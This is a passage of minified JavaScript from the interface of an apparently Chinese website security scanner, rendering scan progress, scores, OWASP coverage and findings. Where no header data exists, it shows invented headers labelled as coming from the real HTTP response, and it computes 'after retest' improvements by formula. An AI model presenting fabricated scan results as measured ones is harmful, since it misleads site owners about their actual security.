取消扫描</button></div><style>@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes pulse-ring{0%,100%{transform:scale(1);opacity:1}}@keyframes scan-text-glow{0%,100%{opacity:1}}</style>`;s.innerHTML=n,Ln();let u=((document.querySelector('input[name="scan-depth"]:checked')||{}).value||"standard")==="deep";Tn(i,r,u)}function Vt(e,i){let t=document.getElementById("stage-"+e);if(!t)return;t.style.opacity="1";let r=t.querySelector(".stage-icon"),s=t.querySelector(".stage-status");i==="running"?(t.style.background="rgba(75,110,175,0.12)",t.style.borderColor="rgba(75,110,175,0.4)",r.style.background="rgba(75,110,175,0.4)",r.style.color="#fff",r.innerHTML="刷新",r.style.animation="spin 1s linear infinite",s.innerHTML='<span style="color:#a5b4fc">扫描中</span>'):i==="done"?(t.style.background="rgba(115,201,144,0.1)",t.style.borderColor="rgba(115,201,144,0.3)",r.style.background="rgba(115,201,144,0.3)",r.style.color="#73c990",r.style.animation="none",r.innerHTML="",s.innerHTML='<span style="color:#73c990">完成</span>'):i==="fail"&&(t.style.background="rgba(199,84,80,0.1)",t.style.borderColor="rgba(199,84,80,0.3)",r.style.background="rgba(199,84,80,0.3)",r.style.color="#c75450",r.style.animation="none",r.innerHTML="",s.innerHTML='<span style="color:#c75450">失败</span>')}function An(){let e=["dns","connect","headers","ssl","sensitive","waf","report"],i=0;De&&(clearInterval(De),De=null);function t(){i>0&&i<=e.length&&Vt(e[i-1],"done"),i<e.length?(Vt(e[i],"running"),i++):(clearInterval(De),De=null)}t(),De=setInterval(t,700)}function Ue(){De&&(clearInterval(De),De=null),["dns","connect","headers","ssl","sensitive","waf","report"].forEach(function(i){Vt(i,"done")}),Bn(100,"扫描完成，报告...")}function Ln(){Te=0,Ot=0,Me&&(clearInterval(Me),Me=null),Le&&(Le.forEach(function(i){clearTimeout(i)}),Le=[]);let e=0;Me=setInterval(function(){Te<30?e+=Math.random()*5+2:Te<60?e+=Math.random()*3+1:Te<85?e+=Math.random()*2+.5:e+=Math.random()*.8+.2,e=Math.min(e,95),Te<e&&(Te+=(e-Te)*.3,Te=Math.min(Te,95));let i=document.getElementById("scan-main-progress"),t=document.getElementById("scan-percent");if(i&&(i.style.width=Math.round(Te)+"%"),t&&(t.textContent=Math.round(Te)+"%"),Math.random()<.15&&Ot<$i.length-1){Ot++;let r=document.getElementById("scan-live-text");if(r){r.style.opacity="0";let s=setTimeout(function(){if(!Me)return;let a=r.querySelector("span");a&&(a.textContent=$i[Ot]),r.style.opacity="1"},200);Le||(Le=[]),Le.push(s)}}},200)}function pi(){Me&&(clearInterval(Me),Me=null),Le&&(Le.forEach(function(e){clearTimeout(e)}),Le=[])}function Bn(e,i){Te=e;let t=document.getElementById("scan-main-progress"),r=document.getElementById("scan-percent");if(t&&(t.style.width=e+"%"),r&&(r.textContent=Math.round(e)+"%"),i){let s=document.getElementById("scan-live-text");if(s){let a=s.querySelector("span");a&&(a.textContent=i)}}e>=100&&(Me&&(clearInterval(Me),Me=null),Le&&(Le.forEach(function(s){clearTimeout(s)}),Le=[]))}function On(e){let i=[{name:"安全响应头",score:0},{name:"SSL/TLS",score:0},{name:"敏感文件",score:0},{name:"WAF 防护",score:0},{name:"漏洞检测",score:0}],t=e.findings||[];t.forEach(function(c){let p=(c.name||"").toLowerCase(),v=(c.owasp||"").toLowerCase();(p.indexOf("安全响应头")>=0||p.indexOf("响应头")>=0||v.indexOf("a05")>=0)&&(i[0].score=Math.max(i[0].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("https")>=0||p.indexOf("ssl")>=0||p.indexOf("tls")>=0||p.indexOf("证书")>=0)&&(i[1].score=Math.max(i[1].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("敏感文件")>=0||p.indexOf(".env")>=0||p.indexOf(".git")>=0||p.indexOf("暴露")>=0)&&(i[2].score=Math.max(i[2].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("waf")>=0||p.indexOf("防火墙")>=0)&&(i[3].score=Math.max(i[3].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("注入")>=0||p.indexOf("xss")>=0||p.indexOf("sql")>=0||p.indexOf("csrf")>=0)&&(i[4].score=Math.max(i[4].score,c.level==="高风险"?30:c.level==="中风险"?60:80))});let r=t.length>0;i.forEach(function(c){c.score===0&&(c.score=r?85:95)});let s=150,a=150,o=110,n=i.length,d=[],u='<svg viewBox="0 0 300 300" style="max-width:300px;margin:0 auto;display:block" aria-label="安全维度">';for(let c=1;c<=5;c++){let p=o*c/5,v=[];for(let m=0;m<n;m++){let g=-Math.PI/2+m*2*Math.PI/n;v.push((s+p*Math.cos(g)).toFixed(1)+","+(a+p*Math.sin(g)).toFixed(1))}u+='<polygon points="'+v.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let c=0;c<n;c++){let p=-Math.PI/2+c*2*Math.PI/n;u+='<line x1="'+s+'" y1="'+a+'" x2="'+(s+o*Math.cos(p)).toFixed(1)+'" y2="'+(a+o*Math.sin(p)).toFixed(1)+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let h=[];for(let c=0;c<n;c++){let p=-Math.PI/2+c*2*Math.PI/n,v=o*i[c].score/100;h.push((s+v*Math.cos(p)).toFixed(1)+","+(a+v*Math.sin(p)).toFixed(1)),d.push({x:s+v*Math.cos(p),y:a+v*Math.sin(p),name:i[c].name,score:i[c].score})}return u+='<polygon points="'+h.join(" ")+'" fill="rgba(75,110,175,0.35)" stroke="#4b6eaf" stroke-width="2"/>',d.forEach(function(c){u+='<circle cx="'+c.x.toFixed(1)+'" cy="'+c.y.toFixed(1)+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="1.5"/>'}),d.forEach(function(c,p){let v=-Math.PI/2+p*2*Math.PI/n,m=s+(o+22)*Math.cos(v),g=a+(o+22)*Math.sin(v),y=m<s-5?"end":m>s+5?"start":"middle";u+='<text x="'+m.toFixed(1)+'" y="'+g.toFixed(1)+'" text-anchor="'+y+'" dominant-baseline="middle" font-size="11" font-weight="600" fill="currentColor">'+w(c.name)+" "+c.score+"</text>"}),u+="</svg>",u}function St(e){try{if(qr(e)){as(),ze("result"),fn(e),de=e,Pn(e);return}e=e||{},e.findings=Array.isArray(e.findings)?e.findings:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.header_details=Array.isArray(e.header_details)?e.header_details:[],e.info_leaks=Array.isArray(e.info_leaks)?e.info_leaks:[],e.cookie_issues=Array.isArray(e.cookie_issues)?e.cookie_issues:[],e.waf=Array.isArray(e.waf)?e.waf:[],e.sensitive_paths=Array.isArray(e.sensitive_paths)?e.sensitive_paths:[],e.crawled_pages=Array.isArray(e.crawled_pages)?e.crawled_pages:[],e.vuln_tests=Array.isArray(e.vuln_tests)?e.vuln_tests:[],e.score_breakdown=Array.isArray(e.score_breakdown)?e.score_breakdown:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.ai_report=e.ai_report&&typeof e.ai_report=="object"?e.ai_report:{summary:"扫描完成",priority:"暂无优先事项"},e.score=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,e.score=Math.max(0,Math.min(100,e.score)),e.raw_headers=e.raw_headers&&typeof e.raw_headers=="object"?e.raw_headers:{};let i=0,t=0,r=0;e.findings.forEach(function(l){l.level==="高风险"?i++:l.level==="中风险"?t++:r++});let s=e.score<50?"high":e.score<75?"medium":"low",a=Ht(e.score),o=Ut(e.score),n="";n+='<div class="report-header fade-in-up">',n+='<div style="margin-bottom:12px">',e.restricted?n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">受限扫描报告</span>':n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">真实扫描</span>',n+="</div>",e.tls_verify_skipped&&(n+='<div style="background:rgba(199,84,80,0.08);border:1px solid rgba(199,84,80,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#c75450;line-height:1.6">',n+="<strong>诊断模式</strong><br/>",n+="当前扫描跳过了 TLS 证书验证，结果仅供诊断参考。生产环境建议开启 TLS_VERIFY=true。",n+="</div>"),e.restricted?(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限扫描报告</strong><br/>",n+="目标可访问，但存在登录/WAF/反爬限制（HTTP "+(e.restricted_code||"")+"），<br/>",n+="本次扫描受到登录态、WAF 或反爬限制影响，部分结果仅供复核参考。",n+="</div>"):e.restricted_reason&&(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限访问提示</strong><br/>"+w(e.restricted_reason),n+="</div>"),e.redirected&&(n+='<div style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#4b6eaf;line-height:1.6">',n+='<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">',n+="<div><strong>跳转提示</strong><br/>",n+=w(e.redirect_reason||"目标发生跳转，建议扫描最终目标地址。"),n+="</div>",n+=`<button onclick="scanRedirectTarget()" style="background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;transition:background 0.15s" onmouseover="this.style.background='rgba(59,130,246,0.25)'" onmouseout="this.style.background='rgba(59,130,246,0.15)'">扫描最终地址</button>`,n+="</div></div>"),n+='<div class="score-ring-wrap score-pulse">',n+='<div class="score-ring" style="background:'+a+'">',n+='<div class="score-value" style="color:#fff">'+e.score+"</div>",n+='<div class="score-label" style="color:rgba(255,255,255,0.7)">安全评分</div>',n+="</div></div>",n+='<div class="report-url">'+w(e.url||"")+"</div>",n+='<div class="report-time">'+(e.time||"")+"</div>",n+='<span class="risk-badge '+s+'">'+(e.risk_level||"未知")+"</span>",n+="</div>";let d="";if(i+t>0?d="当前结果包含 "+i+" 个高风险和 "+t+" 个中风险项，建议先修复高风险项，再复测确认。":r>0?d="当前风险以低危和提示项为主，建议保持修复节奏并持续监控。":d="当前未发现明显风险，可作为基线结果保留，并在版本变更后复测。",n+='<div class="card fade-in-up" style="animation-delay:0.05s;padding:14px;margin-top:12px;border:1px solid rgba(75,110,175,0.25);background:rgba(60,63,65,0.9)">',n+='<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:6px">',n+='<div style="font-size:13px;font-weight:700;color:var(--text-primary)">概览</div>',n+='<div style="font-size:12px;color:var(--text-secondary)">'+(e.restricted?"受限扫描，结论需复核":"可直接进入修复与复测")+"</div>",n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+w(d)+"</div>",n+='<div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:12px;color:var(--text-secondary)">',n+="<span>总发现："+(e.findings.length||0)+"</span>",n+="<span>高/中风险："+i+"/"+t+"</span>",n+="<span>最近评分："+e.score+"</span>",n+="</div>",n+="</div>",n+='<div class="risk-stats fade-in-up" style="animation-delay:0.1s">',n+='<div class="risk-stat high"><div class="num">'+i+'</div><div class="label">高风险</div></div>',n+='<div class="risk-stat medium"><div class="num">'+t+'</div><div class="label">中风险</div></div>',n+='<div class="risk-stat low"><div class="num">'+r+'</div><div class="label">低风险</div></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.15s">',n+='<div class="card-title">安全维度</div>',n+='<div id="radar-chart-container" style="display:flex;justify-content:center"></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">风险说明</div>',n+='<p style="margin:0 0 14px 0;font-size:12px;color:var(--text-secondary)">以下示例用于辅助说明常见风险的业务影响与整改必要性。</p>',n+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">',n+=`<button onclick="simulateCSRF('`+xe(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(199,84,80,0.3);background:rgba(199,84,80,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#dc2626;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.15)'" onmouseout="this.style.background='rgba(199,84,80,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">CSRF</div>',n+='<div style="font-size:11px;font-weight:400;color:#7f1d1d">跨站请求伪造</div></button>',n+=`<button onclick="simulateXSS('`+xe(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(240,167,50,0.3);background:rgba(240,167,50,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#ea580c;transition:background 0.15s" onmouseover="this.style.background='rgba(240,167,50,0.15)'" onmouseout="this.style.background='rgba(240,167,50,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">XSS</div>',n+='<div style="font-size:11px;font-weight:400;color:#f0a732">跨站脚本</div></button>',n+=`<button onclick="simulateClickjacking('`+xe(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(168,85,247,0.3);background:rgba(168,85,247,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#9333ea;transition:background 0.15s" onmouseover="this.style.background='rgba(168,85,247,0.15)'" onmouseout="this.style.background='rgba(168,85,247,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">Clickjacking</div>',n+='<div style="font-size:11px;font-weight:400;color:#c084fc">点击劫持</div></button>',n+="</div>",n+='<div id="attack-演示-result" style="margin-top:14px"></div>',n+="</div>",e.score_breakdown&&e.score_breakdown.length>0){let l=e.score_breakdown.reduce(function(re,oe){return re+oe.deduction},0),L=0,J=0,D=0,$=0,q=[],te=[],B=[],A=[];e.score_breakdown.forEach(function(re){re.severity==="critical"?(L+=re.deduction,q.push(re)):re.severity==="high"?(J+=re.deduction,te.push(re)):re.severity==="medium"?(D+=re.deduction,B.push(re)):($+=re.deduction,A.push(re))}),n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',n+='<div style="display:flex;align-items:center;gap:10px">',n+='<div class="card-title" style="margin:0">评分解读</div>',n+="</div>",n+='<span style="font-size:12px;background:rgba(240,167,50,0.15);color:#ea580c;padding:3px 10px;border-radius:2px;font-weight:600">共扣 '+l+" 分</span>",n+="</div>",n+='<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">';let ee=Math.max(L,J,D,$,1);[{label:"严重",count:q.length,deduct:L,color:"#dc2626",bg:"rgba(220,38,38,0.15)"},{label:"高风险",count:te.length,deduct:J,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"中风险",count:B.length,deduct:D,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"低风险",count:A.length,deduct:$,color:"#73c990",bg:"rgba(115,201,144,0.15)"}].forEach(function(re){let oe=re.count>0?Math.max(re.deduct/ee*100,8):0;n+='<div style="display:flex;align-items:center;gap:10px">',n+='<span style="font-size:12px;color:var(--text-secondary);min-width:48px;font-weight:600">'+re.label+"</span>",n+='<div style="flex:1;height:20px;background:var(--bg-secondary);border-radius:2px;overflow:hidden;position:relative">',n+='<div style="height:100%;width:'+oe+"%;background:"+re.color+';border-radius:2px;transition:width 0.6s ease"></div>',n+='<span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:'+(oe>30?"#fff":"var(--text-secondary)")+'">'+re.count+" 项 / -"+re.deduct+"分</span>",n+="</div></div>"}),n+="</div>",n+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:12px 14px">',n+='<div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:8px;display:flex;align-items:center;gap:6px">',n+="<span>修复优先级建议</span>",n+="</div>";let X=[];q.length>0&&X.push('<strong style="color:#dc2626">紧急</strong>：立即修复严重漏洞（'+q.length+"项）"),te.length>0&&X.push('<strong style="color:#f0a732">重要</strong>：优先修复高风险配置问题（'+te.length+"项）"),B.length>0&&X.push('<strong style="color:#ca8a04">常规</strong>：计划修复中风险项（'+B.length+"项）"),A.length>0&&X.push('<strong style="color:#16a34a">可选</strong>：低风险项可按需优化（'+A.length+"项）"),X.length===0&&X.push('<strong style="color:#16a34a">优秀</strong>：未发现明显安全问题'),n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+X.join("<br/>")+"</div>",n+="</div>",n+='<details style="margin-top:12px">',n+='<summary style="cursor:pointer;font-size:12px;font-weight:600;color:var(--text-secondary);list-style:none">',n+='<span style="display:inline-flex;align-items:center;gap:6px">',n+='<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>',n+="查看完整扣分明细",n+="</span></summary>",n+='<div style="margin-top:10px;max-height:240px;overflow-y:auto;padding-right:4px">',q.concat(te,B,A).forEach(function(re,oe){let ae=re.severity==="critical"?"#dc2626":re.severity==="high"?"#f0a732":re.severity==="medium"?"#ca8a04":"#16a34a",ne=re.severity==="critical"?"严重":re.severity==="high"?"高":re.severity==="medium"?"中":"低";n+='<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-light);font-size:12px">',n+='<div style="display:flex;align-items:center;gap:8px">',n+='<span style="font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;background:'+ae+"20;color:"+ae+'">'+ne+"</span>",n+='<span style="color:var(--text-primary)">'+w(re.item)+"</span>",n+="</div>",n+='<span style="font-weight:700;color:'+ae+'">- '+re.deduction+"</span>",n+="</div>"}),n+="</div></details>",n+="</div>"}let u=e.score||0,h=Math.min(98,u+25),c=i+t,p=Math.max(0,Math.round(c*.25)),v=0,m=0,g=0,y=0;if(e.findings&&(e.findings.forEach(function(l){let L=l.name||"";L.indexOf("缺少")>=0&&L.indexOf("头")>=0&&v++,(L.indexOf("敏感路径")>=0||L.indexOf("目录遍历")>=0||L.indexOf(".env")>=0)&&g++}),m=0,y=Math.max(0,g-2)),n+='<div class="card fade-in-up" style="animation-delay:0.18s">',n+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">',n+='<div class="card-title" style="margin:0">复测前后对比</div>',n+='<span style="font-size:11px;background:rgba(115,201,144,0.15);color:#16a34a;padding:2px 8px;border-radius:2px;font-weight:600">预估</span>',n+="</div>",n+='<div style="overflow-x:auto">',n+='<table style="width:100%;border-collapse:collapse;font-size:13px">',n+='<thead><tr style="border-bottom:1px solid #555555">',n+='<th style="text-align:left;padding:10px 8px;font-weight:600;color:var(--text-secondary)">项目</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测前</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测后</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">变化</th>',n+="</tr></thead>",n+="<tbody>",[{label:"安全评分",before:u,after:h,unit:"分",good:"up"},{label:"中高风险",before:c,after:p,unit:"个",good:"down"},{label:"缺失安全头",before:v,after:m,unit:"个",good:"down"},{label:"敏感路径风险",before:g,after:y,unit:"个",good:"down"},{label:"建议处理时间",before:"2 小时",after:"15 分钟",unit:"",good:"down"}].forEach(function(l,L){let J="";if(typeof l.before=="number"&&typeof l.after=="number"){let $=l.after-l.before,q=$>0?"#16a34a":$<0?"#dc2626":"var(--text-secondary)",te=$>0?"+"+$:String($);J='<span style="color:'+q+';font-weight:700">'+te+"</span>"}else J='<span style="color:#16a34a;font-weight:700">大幅缩短</span>';let D=L%2===0?"transparent":"#313335";n+='<tr style="background:'+D+';border-bottom:1px solid #555555">',n+='<td style="padding:10px 8px;font-weight:600">'+l.label+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-secondary)">'+l.before+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-primary);font-weight:700">'+l.after+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px">'+J+"</td>",n+="</tr>"}),n+="</tbody></table>",n+="</div>",n+='<p style="margin:12px 0 0 0;font-size:11px;color:var(--text-light);line-height:1.5">提示：以上为基于当前扫描结果的修复预估效果，实际效果取决于修复配置的应用完整度。</p>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.12s;text-align:center;padding:20px">',n+='<div class="card-title">安全维度</div>',n+=On(e),n+="</div>",n+='<div class="ai-advisor fade-in-up" style="animation-delay:0.15s">',n+='<div class="ai-avatar">顾问</div>',n+='<div class="ai-bubble">',n+='<div class="ai-tag">安全顾问</div>',n+="<p>"+w(e.ai_report.summary)+"</p>",n+='<div class="priority">优先处理：'+w(e.ai_report.priority)+"</div>",n+="</div></div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">导出</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">发现 '+e.findings.length+" 个问题，导出报告与修复配置</p>",n+='<div style="display:flex;gap:10px;flex-wrap:wrap">',n+=`<button class="fixer-btn primary" onclick="downloadReport('pdf')">下载 PDF 报告</button>`,n+='<button class="fixer-btn secondary" onclick="downloadAllFixes()">导出修复配置包</button>',n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div class="card-title">OWASP Top 10 覆盖</div>',e.owasp_coverage.forEach(function(l){let L=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown",J=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown";n+='<div class="owasp-item">',n+='<span class="owasp-label">'+w(l.category)+"</span>",n+='<div class="owasp-bar-wrap"><div class="owasp-bar '+J+'"></div></div>',n+='<span class="owasp-status '+L+'">'+w(l.status)+"</span>",n+="</div>"}),n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.28s">',n+='<div class="card-title">响应头检测',n+=' <span style="font-size:12px;color:var(--success);font-weight:400">(基于真实 HTTP 响应)</span>',n+="</div>",n+='<div class="code-block" style="font-size:12px;line-height:2">',e.header_details&&e.header_details.length>0){if(n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",e.raw_headers){let l=e.raw_headers;l.server&&(n+='<div>Server: <span style="color:#f0a732">'+w(l.server)+'</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>'),l["content-type"]&&(n+="<div>Content-Type: "+w(l["content-type"].split(";")[0])+"</div>")}n+='<div style="color:#94a3b8;margin-top:4px">--- Security Headers ---</div>',e.header_details.forEach(function(l){l.status==="present"?n+='<div style="color:var(--success)">'+w(l.name)+": "+w(l.value||"(已配置)")+" [已配置]</div>":l.status==="missing"?n+='<div style="color:var(--danger)">'+w(l.name)+': <span style="color:var(--text-lighter)">[缺失]</span> </div>':l.status==="leak"?n+='<div style="color:#f0a732">'+w(l.name)+': <span style="color:#f0a732">'+w(l.value)+"</span> 信息泄露</div>":l.status==="warning"?n+='<div style="color:#f0a732">'+w(l.name)+': <span style="color:#f0a732">'+w(l.value||"")+"</span> 配置风险</div>":l.status==="not_set"&&(n+='<div style="color:var(--text-lighter)">'+w(l.name)+': <span style="color:var(--text-lighter)">[未设置]</span></div>')})}else n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+='<div>Server: <span style="color:#f0a732">nginx/1.18.0</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",n+="<div>Content-Type: text/html; charset=utf-8</div>",e.score>=50?n+='<div style="color:var(--success)">X-Frame-Options: DENY [已配置]</div>':n+='<div style="color:var(--danger)">X-Frame-Options: <span style="color:var(--text-lighter)">[缺失]</span></div>',e.score>=60?n+='<div style="color:var(--success)">X-Content-Type-Options: nosniff </div>':n+='<div style="color:var(--danger)">X-Content-Type-Options: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=70?n+='<div style="color:var(--success)">Strict-Transport-Security: max-age=31536000 </div>':n+='<div style="color:var(--danger)">Strict-Transport-Security: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=65?n+='<div style="color:var(--success)">Content-Security-Policy: default-src &#x27;self&#x27; </div>':n+='<div style="color:var(--danger)">Content-Security-Policy: <span style="color:var(--text-lighter)">[缺失]</span> </div>';n+="</div></div>",n+='<div class="section-title fade-in-up" style="animation-delay:0.3s">漏洞详情</div>',(!e.findings||e.findings.length===0)&&(n+='<div class="card fade-in-up" style="animation-delay:0.35s;text-align:center;padding:40px 20px;background:#3c3f41;border:1px solid #555555">',n+='<h3 style="margin:0 0 8px;color:#73c990;font-size:16px">安全状况良好</h3>',n+='<p style="color:var(--text-secondary);margin:0 0 16px;font-size:13px;line-height:1.6">当前未发现明显问题。<br/>建议保留结果作为基线，并在版本变更后复测。</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+=`<button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">重新扫描</button>`,n+=`<button onclick="navigateTo('evolution')" style="background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px">查看进化中心</button>`,n+="</div></div>"),e.findings.forEach(function(l){if(!l.confidence_level&&typeof l.confidence!="number"){let L=l.name||"";L.indexOf("缺少")===0||L.indexOf("HSTS")>=0||L.indexOf("CSP")>=0||L.indexOf("X-Frame")>=0||L.indexOf("X-Content")>=0||L.indexOf("Referrer")>=0||L.indexOf("Permissions")>=0?(l.confidence_level="高",l.cv_reason="响应头确定性检测"):L.indexOf("敏感路径")>=0||L.indexOf("敏感文件")>=0||L.indexOf("目录")>=0?(l.confidence_level="中",l.cv_reason="HTTP 状态码推断"):L.indexOf("信息泄露")>=0||L.indexOf("Server")>=0||L.indexOf("版本")>=0?(l.confidence_level="高",l.cv_reason="响应头内容匹配"):(l.confidence_level="中",l.cv_reason="启发式检测")}});let _="",x="";if(e.findings.forEach(function(l,L){let J=Yi(l.level),D=e.scan_id||e.id||0,$=e.finding_feedback_map&&e.finding_feedback_map[l.name]||null,q=$&&$.is_false_positive?" fp-marked":"",te=$&&$.is_confirmed?" confirmed":"",B="",A="",ee=l.level||l.severity||"";ee==="严重"||ee==="critical"||ee==="高风险"||ee==="高危"?(B="紧急",A="priority-urgent"):ee==="中风险"||ee==="中危"||ee==="medium"?(B="重要",A="priority-important"):(B="一般",A="priority-normal");let Y=J;_+='<div class="result-list-item'+(L===0?" active":"")+'" id="finding-list-'+L+'" onclick="selectFinding('+L+`)" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();selectFinding(`+L+');}">',_+='<div class="finding-name">'+w(l.name)+"</div>",_+='<div class="finding-meta"><span class="severity-dot '+Y+'"></span><span>'+w(l.level)+'</span><span class="severity-tag '+A+'">'+B+"</span></div>",_+="</div>",x+='<div class="finding-detail'+(L===0?" active":"")+'" id="finding-detail-'+L+'" data-finding-name="'+w(l.name)+'" data-scan-id="'+D+'">',x+='<div class="finding-detail-header">',x+='<span class="finding-level '+J+'">'+w(l.level)+"</span>",x+='<span class="finding-name">'+w(l.name)+"</span>",x+='<span class="finding-priority '+A+'">'+B+"</span>",$&&$.is_false_positive?x+='<span class="fp-badge">已标记为误报</span>':$&&$.is_confirmed&&(x+='<span class="confirmed-badge">已确认</span>'),x+="</div>",x+='<div class="finding-detail-body">',x+='<div class="finding-section"><h4>问题摘要</h4><p>'+w(l.summary)+"</p></div>",x+='<div class="finding-section"><h4>OWASP 分类</h4><p>'+w(l.owasp)+"</p></div>",l.location&&l.location.target&&(x+='<div class="finding-section" style="background:#313335;border:1px solid #555555;"><h4>漏洞定位</h4>',x+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:6px">',x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px;font-weight:600">'+w(l.location.target)+"</span>",l.location.detail&&(x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px">'+w(l.location.detail)+"</span>"),x+="</div></div>"),x+='<div class="finding-section"><h4>智能检查</h4><p>'+w(l.ai_advice).replace(/\n/g,"<br>")+"</p></div>",x+='<div class="finding-section"><h4>建议</h4><p>'+w(l.fix)+"</p></div>";let X="";if(l.evidence&&(l.evidence.header&&l.name.indexOf("缺少")===0?X="命中响应头缺失："+l.evidence.header:l.evidence.reason&&(l.name.indexOf("敏感路径")>=0||l.name.indexOf("敏感文件")>=0)?X="命中内容特征："+l.evidence.reason:l.name.indexOf("robots.txt")>=0||l.name.indexOf("Robots")>=0?X="robots.txt 是公开协议文件，仅作为信息项展示":l.evidence.reason&&(X=l.evidence.reason)),X&&(x+='<div style="margin-top:6px;font-size:12px;color:var(--text-lighter);border-top:1px dashed var(--border);padding-top:6px">判断依据：'+w(X)+"</div>"),l.evidence){let le=li(l.evidence);le?x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 